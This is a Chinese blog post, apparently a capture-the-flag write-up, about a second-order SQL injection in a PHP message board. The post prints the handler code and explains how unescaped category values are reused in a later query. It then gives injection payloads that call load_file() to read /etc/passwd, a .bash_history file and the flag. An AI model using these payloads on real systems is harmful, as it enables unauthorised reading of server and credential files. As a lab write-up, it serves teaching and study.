-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    $category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into board</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                title = &#x27;$title&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,  </span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: ./comment.php?id=$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在发帖处给$title、$category和$content三个参数输入的值中的特殊符号会被addslashes()函数转义，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br></pre></td></tr></table></figure>
-
-<p>但是仍然会将这些值加入到数据库中，且加入到数据库后，转义的反斜杠会消失</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into board</span><br><span class="line">        set category = &#x27;$category&#x27;,</span><br><span class="line">            title = &#x27;$title&#x27;,</span><br><span class="line">            content = &#x27;$content&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
-
-<p>而在详情中的提交留言界面，只有$bo_id和$content参数的值中的特殊符号被addslashes()函数用反斜杠转义</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">$content = addslashes($_POST[&#x27;content&#x27;]);</span><br></pre></td></tr></table></figure>
-<p>而$category参数的值，是将board表中的$category参数的值拿出来，其中没有经过addslashes()函数转义</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br></pre></td></tr></table></figure>
-<p>所以可以看出存在二次注入，因此我们可以在反贴处中的$category写入恶意代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=user(),/*</span><br></pre></td></tr></table></figure>
-<p>然后在留言处的$content参数中输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-<p>其中/**/是多行注释，#是单行注释</p>
-<p>我们可以看见</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost</span><br></pre></td></tr></table></figure>
-<p>可知这是root权限，所以我们可以尝试使用load_file()函数来读取文件，和上面一样构造<br>发帖处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/etc/passwd&#x27;))),/*</span><br></pre></td></tr></table></figure>
-<p>留言处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-
-<p>读取历史操作</p>
-<p>发帖处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/home/www/.bash_history&#x27;))),/*</span><br></pre></td></tr></table></figure>
-
-<p>留言处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-
-<p>注意到/var/www/html目录下的.DS_Store文件被删除，但是在/tmp/html目录下仍然有.DS_Store文件<br>发帖处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*</span><br></pre></td></tr></table></figure>
-
-<p>留言处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-
-<p>然后将获取的十六进制数据放到winhex，可以看见flag_8946e1ff1ee3e40f.php<br>发帖处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/tmp/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*</span><br></pre></td></tr></table></figure>
-
-<p>留言处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-<p>发现是一个假的flag</p>
-<p>所以访问/var/www/html/目录下的flag_8946e1ff1ee3e40f.php<br>发帖处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*</span><br></pre></td></tr></table></figure>
-
-<p>留言处</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
-
-<p>就可以读到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
